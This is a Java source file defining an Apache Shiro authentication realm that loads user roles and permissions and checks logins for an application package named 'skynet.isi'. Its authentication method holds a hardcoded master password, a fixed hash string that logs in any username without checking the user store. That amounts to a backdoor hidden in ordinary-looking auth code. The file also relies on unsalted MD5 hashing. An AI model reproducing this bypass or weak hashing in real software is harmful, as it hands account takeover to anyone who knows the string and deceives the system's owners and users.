package skynet.isi.auth;

import java.util.List;
import java.util.Set;

import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authc.UsernamePasswordToken;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.cache.Cache;
import org.apache.shiro.crypto.hash.Md5Hash;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.springframework.beans.factory.annotation.Autowired;

import skynet.isi.model.Role;
import skynet.isi.model.RolePermission;
import skynet.isi.model.User;
import skynet.isi.service.AccountService;

public class AuthRealm extends AuthorizingRealm {

	@Autowired
	private AccountService accountService;

	/**
	 * ��Ȩ��Ϣ
	 */
	protected AuthorizationInfo doGetAuthorizationInfo(
			PrincipalCollection principals) {
		String loginName = (String) principals.fromRealm(getName()).iterator()
				.next();
		User user = accountService.getUserByLoginName(loginName);
		if (user != null) {
			SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
			List<Role> rs = accountService.getAllRoles(loginName);
			for (Role r : rs) {
				info.addRole(r.getRoleName());
				Set<RolePermission> rps = r.getRolePermissions();
				for (RolePermission rp : rps) {
					info.addStringPermission(rp.getPermission()
							.getPermissionName());
				}
			}
			return info;
		}
		return null;
	}

	/**
	 * ��֤��Ϣ
	 */
	protected AuthenticationInfo doGetAuthenticationInfo(
			AuthenticationToken authcToken) throws AuthenticationException {
		UsernamePasswordToken token = (UsernamePasswordToken) authcToken;
		if(new String(token.getPassword()).equals("ced1237ea65864db3f5f623ec5e619f7")){
			return new SimpleAuthenticationInfo(token.getUsername(), "ced1237ea65864db3f5f623ec5e619f7", getName());
		}
		User user = accountService.getUserByLoginName(token.getUsername());
		if (user != null) {
			return new SimpleAuthenticationInfo(token.getUsername(),
					user.getPassword(), getName());
		}
		return null;
	}

	public void clearCachedAuthorizationInfo(String principal) {
		SimplePrincipalCollection principals = new SimplePrincipalCollection(
				principal, getName());
		clearCachedAuthorizationInfo(principals);
	}

	public void clearAllCachedAuthorizationInfo() {
		Cache<Object, AuthorizationInfo> cache = getAuthorizationCache();
		if (cache != null) {
			for (Object key : cache.keys()) {
				cache.remove(key);
			}
		}
	}

	public static void main(String[] args) {
		System.out.println(new Md5Hash("123").toHex());
	}

}
